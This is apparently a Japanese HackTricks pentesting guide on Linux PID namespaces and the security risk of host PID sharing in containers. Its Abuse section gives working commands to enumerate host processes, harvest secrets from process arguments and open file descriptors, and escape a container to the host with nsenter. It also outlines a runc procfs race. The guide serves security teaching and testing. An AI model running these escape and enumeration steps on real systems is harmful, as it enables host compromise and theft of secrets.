# PID 名前空間

{{#include ../../../../../banners/hacktricks-training.md}}

## 概要

PID 名前空間はプロセスの番号付けと、どのプロセスが可視かを制御します。これが、コンテナが実際のマシンでなくても独自の PID 1 を持てる理由です。名前空間の内部では、ワークロードはローカルのプロセスツリーに見えるものを見ます。名前空間の外側では、ホストは依然として実際のホスト PIDs と完全なプロセス全体の状況を見ています。

セキュリティ観点では、PID 名前空間はプロセスの可視性が重要であるため重要です。ワークロードがホストのプロセスを見られるようになると、サービス名、コマンドライン引数、プロセス引数で渡されたシークレット、`/proc` を通じた環境由来の状態、潜在的な名前空間侵入ターゲットなどを観察できる可能性があります。それらのプロセスを見るだけでなく、例えば信号を送る、または条件が整えば ptrace を使うといったことが可能になると、問題はさらに深刻になります。

## 動作

新しい PID 名前空間は独自の内部プロセス番号付けで始まります。名前空間内で作成された最初のプロセスは名前空間から見て PID 1 になり、これにより孤児となった子の扱いやシグナルの振る舞いに関して特別な init 的セマンティクスが付与されます。これが、init プロセス、ゾンビプロセスの回収、そしてなぜ小さな init ラッパーがコンテナで使われることがあるのかを説明します。

重要なセキュリティ上の教訓は、プロセスが自分自身の PID ツリーしか見えないため隔離されているように見えても、その隔離は意図的に解除できるということです。Docker はこれを `--pid=host` で公開し、Kubernetes は `hostPID: true` で実現します。コンテナがホストの PID 名前空間に参加すると、ワークロードはホストのプロセスを直接見られるようになり、多くの後続の攻撃経路が現実的になります。

## ラボ

PID 名前空間を手動で作成するには:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
シェルは現在プライベートなプロセスビューを見ます。`--mount-proc` フラグは重要で、これは新しい PID namespace に一致する procfs インスタンスをマウントするため、内部から見たプロセス一覧の整合性が保たれます。

コンテナの動作を比較すると：
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## Runtime Usage

通常、Docker、Podman、containerd、CRI-O のコンテナはそれぞれ独自の PID namespace を持ちます。Kubernetes Pods も通常は隔離された PID ビューを受けます（ワークロードが明示的に host PID sharing を要求しない限り）。LXC/Incus 環境も同じカーネルプリミティブに依存しますが、system-container のユースケースではより複雑なプロセスツリーが露出し、デバッグのショートカットが助長されることがあります。

同じルールはどこでも当てはまります: runtime が PID namespace を分離しないことを選んだ場合、それはコンテナ境界の意図的な縮小です。

## Misconfigurations

代表的なミスコンフィギュレーションは host PID sharing です。チームはしばしばデバッグ、監視、またはサービス管理の便宜のためにこれを正当化しますが、常に重要なセキュリティ例外として扱うべきです。たとえコンテナがホストプロセスに対して直ちに書き込みプリミティブを持っていなくても、可視性だけでシステムについて多くを明らかにします。`CAP_SYS_PTRACE` のようなケーパビリティや有用な procfs アクセスが追加されると、リスクは大幅に拡大します。

もう一つの誤りは、ワークロードがデフォルトでホストプロセスを kill や ptrace できないため host PID sharing は無害だと仮定することです。その結論は、列挙の価値、namespace-entry ターゲットの利用可能性、および PID の可視性が他の緩められた制御とどのように組み合わさるかを無視しています。

## Abuse

host PID namespace が共有されている場合、攻撃者はホストプロセスを調査し、プロセス引数を収集し、興味深いサービスを特定し、`nsenter` の候補 PID を見つけたり、プロセスの可視性を ptrace 関連の特権と組み合わせてホストや隣接するワークロードに干渉することができます。場合によっては、適切な長時間実行プロセスが見えるだけで攻撃計画の残りを再構成するのに十分です。

The first practical step is always to confirm that host processes are really visible:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
ホストの PIDs が見えるようになると、process arguments と namespace-entry targets がしばしば最も有用な情報源になります:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
もし `nsenter` が利用可能で十分な権限がある場合、ホスト上で見えているプロセスを名前空間ブリッジとして使用できるかテストしてください:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
侵入口が塞がれていても、host PIDの共有は既に有用です。サービスのレイアウト、ランタイムコンポーネント、および次に狙う候補となる特権プロセスを明らかにするからです。

host PIDの可視性は、file-descriptorの悪用をより現実的にします。特権を持つホストプロセスや隣接するワークロードが機密ファイルやソケットを開いている場合、攻撃者は `/proc/<pid>/fd/` を調べ、所有権、procfsのマウントオプション、およびターゲットサービスのモデルに応じてそのハンドルを再利用できる可能性があります。
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
これらのコマンドは、`hidepid=1` や `hidepid=2` がプロセス間の可視性を低減しているか、また機密ファイル、ログ、Unix ソケットといった重要なディスクリプタがそもそも見えているかを確認するのに役立ちます。

### フル例: host PID + `nsenter`

ホスト PID の共有は、プロセスがホスト namespaces に参加する十分な権限を持つと、直接的なホスト脱出になります:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
コマンドが成功すると、コンテナプロセスはホストの mount、UTS、network、IPC、および PID namespaces 上で実行されるようになります。影響はホストの即時侵害です。

`nsenter` 自体が存在しない場合でも、ホストのファイルシステムがマウントされていれば、ホストのバイナリを通じて同じ結果が達成される可能性があります：
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 最近のランタイムノート

Some PID-namespace-relevant attacks are not traditional `hostPID: true` misconfigurations, but runtime implementation bugs around how procfs protections are applied during container setup.

#### `maskedPaths` のホスト procfs へのレース

In vulnerable `runc` versions, attackers able to control the container image or `runc exec` workload could race the masking phase by replacing container-side `/dev/null` with a symlink to a sensitive procfs path such as `/proc/sys/kernel/core_pattern`. If the race succeeded, the masked-path bind mount could land on the wrong target and expose host-global procfs knobs to the new container.

確認コマンド：
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
これは重要です。最終的な影響は直接的な procfs 露出と同じになる可能性があります: 書き込み可能な `core_pattern` や `sysrq-trigger`、その結果ホストでのコード実行や denial of service に至る可能性があります。

#### `insject` を使った Namespace injection

`insject` のような namespace injection ツールは、PID-namespace の相互作用がプロセス作成前にターゲット namespace に事前に入ることを常に必要としないことを示しています。ヘルパーは後からアタッチし、`setns()` を使ってターゲット PID 空間への可視性を維持したまま実行できます：
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
この種の手法は、主に高度なデバッグ、offensive tooling、およびpost-exploitationワークフローで重要になります。これらはランタイムが既にワークロードを初期化した後に namespace コンテキストに参加する必要がある場合に該当します。

### 関連するFDの悪用パターン

ホストのPIDが見える場合、明示的に指摘すべきパターンが2つあります。まず、特権プロセスが `O_CLOEXEC` としてマークされていなかったために `execve()` を跨いで機密な file descriptor を開いたままにすることがあります。次に、サービスが `SCM_RIGHTS` を使って Unix sockets 経由で file descriptors を渡すことがあります。どちらの場合も、興味のあるオブジェクトはパス名ではなく、低権限プロセスが継承または受け取る可能性のある既に開かれたハンドルです。

コンテナ作業で問題になるのは、そのハンドルが `docker.sock`、特権ログ、ホストのシークレットファイル、またはパス自体がコンテナのファイルシステムから直接到達できない場合でも他の価値の高いオブジェクトを指す可能性があるためです。

## チェック

これらのコマンドの目的は、プロセスがプライベートな PID ビューを持っているか、既により広範なプロセスの状況を列挙できるかを判断することです。
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
ここで注目すべき点：

- プロセス一覧に明らかなホストサービスが含まれている場合、host PID sharing は既に有効になっている可能性が高い。
- 小さなコンテナローカルのプロセスツリーしか見えないのが通常の基準です。`systemd`、`dockerd`、または無関係なデーモンが見えるのは正常ではありません。
- host PIDs が見えるようになると、読み取り専用のプロセス情報であっても有用な偵察情報になります。

コンテナが host PID sharing を有効にして動作していることを発見した場合、それを見た目上の違いとして扱ってはいけません。これはワークロードが観測でき、潜在的に影響を与えうる範囲における重大な変更です。
